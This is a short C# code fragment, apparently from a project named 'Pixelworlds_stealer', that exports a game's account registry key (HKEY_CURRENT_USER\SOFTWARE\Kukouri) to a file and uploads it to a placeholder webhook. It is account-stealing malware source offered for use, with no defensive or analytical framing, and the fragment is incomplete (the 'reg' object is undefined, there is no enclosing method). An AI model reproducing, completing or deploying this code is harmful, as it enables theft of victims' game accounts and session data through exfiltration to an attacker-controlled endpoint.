
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using Pixelworlds_stealer;


reg.ExportKey("HKEY_CURRENT_USER\\SOFTWARE\\Kukouri", "C:\\account.reg");


using (WebClient client = new WebClient())
{
    client.UploadFile("WEBHOOK HERE!", "C:/account.reg");
}
